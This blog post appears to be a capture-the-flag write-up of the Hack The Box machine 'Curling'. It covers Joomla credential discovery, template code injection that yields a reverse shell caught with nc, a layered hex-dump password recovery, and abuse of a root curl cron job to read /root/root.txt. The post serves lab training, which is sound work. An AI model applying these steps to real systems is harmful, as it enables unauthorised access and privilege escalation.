---
layout: post
category: writeup
---

## Machine Info

- Name: Curling
- Description:  Curling is an Easy difficulty Linux box which requires a fair amount of enumeration. The password is saved in a file on the web root. The username can be download through a post on the CMS which allows a login. Modifying the php template gives a shell. Finding a hex dump and reversing it gives a user shell. On enumerating running processes a cron is discovered which can be exploited for root.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

visiting the webpage I see the following:

![](assets/images/2024-01-19-curling-image-1.png)
This gives me the hint to cewl the site, while I do that I'll also dirsearch in the background.

I see that there is a file called secret.txt:

![](assets/images/2024-01-19-curling-image-2.png)

So I navigate to that page:
![](assets/images/2024-01-19-curling-image-3.png)

looks like base64 so I'll decode it:

![](assets/images/2024-01-19-curling-image-4.png)

from there I will attempt to login, on the main page I see the user name is floris.

Login successful:
![](assets/images/2024-01-19-curling-image-5.png)

Now I have a bunch of options as to what I can do to execute code but the easiest is to embed code into the index.php of the main page template and refresh:

![](assets/images/2024-01-19-curling-image-6.png)

Now I refresh the page and get a shell:
```bash
HTB nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.150] 50932
bash: cannot set terminal process group (1328): Inappropriate ioctl for device
bash: no job control in this shell
www-data@curling:/var/www/html$
```

## Privilege Escalation

Initial enum didn't yield anything, so I looked towards floris's home directory and found a `password_backup` file, it had some levels to it VERY CTFy very boring and unreastic:
```bash
www-data@curling:/tmp$ xxd -r password_backup > file
www-data@curling:/tmp$ file file
file: bzip2 compressed data, block size = 900k
www-data@curling:/tmp$ mv file file.bz
www-data@curling:/tmp$ bzip2 -d file.bz 
www-data@curling:/tmp$ ls
file  password_backup
www-data@curling:/tmp$ file file 
file: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix
www-data@curling:/tmp$ mv file file.gz
www-data@curling:/tmp$ gunzip -d file.gz 
www-data@curling:/tmp$ ls  
file  password_backup
www-data@curling:/tmp$ file file
file: bzip2 compressed data, block size = 900k
www-data@curling:/tmp$ mv file file.bz
www-data@curling:/tmp$ bzip2 -d file.bz 
www-data@curling:/tmp$ ls
file  password_backup
www-data@curling:/tmp$ file file
file: POSIX tar archive (GNU)
www-data@curling:/tmp$ mv file file.tar
www-data@curling:/tmp$ tar -xvf file.tar 
password.txt
www-data@curling:/tmp$ cat password.txt
5d<wdCbdZu)|hChXll
```

Now I can su into floris:
```bash
www-data@curling:/tmp$ su floris
Password:
floris@curling:/tmp$
```

I see this directory called `admin-area` and it's interesting:
```bash
floris@curling:~/admin-area$ ls
input  report
floris@curling:~/admin-area$ ls -la
total 28
drwxr-x--- 2 root   floris  4096 Aug  2  2022 .
drwxr-xr-x 6 floris floris  4096 Aug  2  2022 ..
-rw-rw---- 1 root   floris    25 Jan 19 22:49 input
-rw-rw---- 1 root   floris 14238 Jan 19 22:49 report
floris@curling:~/admin-area$ cat input 
url = "http://127.0.0.1"
```

The input file is just a url, and the report is the file, what seems to be curled. 

I will confirm this theory with pspy64

```bash
/bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```

Every minute the command above is executed, it curls the command then outputs it in the report. I'll replace it with the following:

```bash
floris@curling:~/admin-area$ cat input 
url = "file:///root/root.txt"
```

I wait for a bit and check the file:

```bash
floris@curling:~/admin-area$ cat report 
aeb6c2cb3c1f80e031d5fd2ea9fab3f7
```

best,
gerbsec